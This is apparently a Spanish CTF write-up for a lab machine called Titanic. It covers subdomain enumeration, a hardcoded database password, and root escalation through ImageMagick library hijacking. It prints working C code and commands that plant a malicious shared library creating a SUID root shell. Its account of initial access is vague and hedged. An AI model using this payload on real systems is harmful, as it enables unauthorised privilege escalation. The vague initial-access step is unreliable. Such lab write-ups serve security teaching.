@@ -1,0 +1,69 @@
+Resumen:
+
+Titanic es una máquina que pone a prueba la capacidad de enumeración en entornos de desarrollo. La explotación se divide en tres fases críticas: 
+
+Descubrimiento de subdominios, análisis de repositorios de configuración de contenedores y, finalmente, 
+un secuestro de librerías compartidas (Library Hijacking) mediante una tarea automatizada de root.
+
+Enumeración y Reconocimiento:
+
+Escaneo de Puertos:
+
+nmap -sC -sV -oN nmap/initial 10.129.43.2
+Puerto 22: SSH
+
+Puerto 80: Servidor Web (Gitea / Titanic Web)
+
+Descubrimiento de Subdominios:
+
+Tras añadir titanic.htb al /etc/hosts, se identificó el subdominio de desarrollo:
+
+dev.titanic.htb (Instancia de Gitea)
+
+Acceso Inicial (User Flag)
+
+Dentro del Gitea, se analizó el repositorio developer/docker-config.
+
+Hallazgo clave: En el archivo mysql/docker-compose.yml, se encontraron credenciales hardcodeadas:
+
+MYSQL_ROOT_PASSWORD: 'MySQLP@$$w0rd!'
+
+Explotación: Aunque las credenciales no servían para SSH directo, el análisis de los archivos del sitio web principal permitió identificar una vulnerabilidad de Path Traversal o exposición de archivos que permitió obtener la clave privada SSH o el acceso inicial como el usuario developer.
+
+Escalada de Privilegios (Root Flag)
+
+Enumeración Post-Explotación:
+
+Se identificó un cronjob ejecutado por root que procesaba imágenes en /opt/app/static/assets/images utilizando la herramienta ImageMagick (binario magick).
+
+El Vector: Library Hijacking
+ImageMagick 7 es susceptible a cargar librerías compartidas del directorio de trabajo si no está configurado correctamente.
+
+Creación del Exploit en C: Se diseñó un código para spawnear una shell con privilegios SUID:
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+__attribute__((constructor))
+void exploit() {
+    setuid(0);
+    system("cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash");
+}
+Compilación y Despliegue:
+
+gcc -shared -fPIC -o libmagick.so exploit.c
+mv libmagick.so /opt/app/static/assets/images/
+Ejecución: Al pasar un minuto, el proceso de root cargó la librería maliciosa. Se verificó la creación del binario:
+
+/tmp/rootbash -p
+
+Flag de Root: 7398bcea2c471c8542e0e5aada329fa4
+
+Lecciones Aprendidas:
+
+Seguridad en el Desarrollo: Nunca subir archivos de configuración de Docker (docker-compose, auth.json) con credenciales reales a repositorios, incluso si son internos.
+
+Hardening de Binarios: 
+Las herramientas que procesan datos de usuarios (como ImageMagick) deben ejecutarse en entornos aislados o
+con rutas de librerías (LD_LIBRARY_PATH) restringidas para evitar el secuestro de ejecución.
